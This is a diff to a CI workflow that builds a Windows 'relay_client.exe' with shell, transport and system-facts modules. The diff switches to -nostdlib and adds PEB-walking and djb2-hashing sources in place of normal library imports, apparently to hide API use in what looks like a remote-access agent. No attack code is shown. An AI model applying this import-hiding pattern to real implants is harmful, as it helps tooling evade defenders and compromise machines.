@@ -67,11 +67,11 @@ jobs:
           BUILD_NUMBER=$(git rev-list --count HEAD)
           COMMIT_HASH=$(git rev-parse --short=8 HEAD)
           echo "=== building windows-${{ matrix.arch }} (${{ matrix.triple }}-gcc) ==="
-          ${{ matrix.triple }}-gcc -O2 -s -Wall -Wextra \
+          ${{ matrix.triple }}-gcc -O2 -s -nostdlib -e entry -Wall -Wextra \
               -DID_BUILD_NUMBER="$BUILD_NUMBER" \
               -DAGENT_COMMIT_HASH="\"$COMMIT_HASH\"" \
-              -o relay_client.exe main.c transport.c shell.c report.c system_facts.c \
-              -lwinhttp -ladvapi32
+              -o relay_client.exe entry.c main.c transport.c shell.c report.c system_facts.c winhttp_api.c ntdll.c kernel32.c advapi.c string.c memory.c peb.c system.c djb2.c logger.c \
+              # -lwinhttp -ladvapi32
           mkdir -p artifacts
           cp relay_client.exe "artifacts/windows-${{ matrix.arch }}.exe"
           ls -la artifacts/
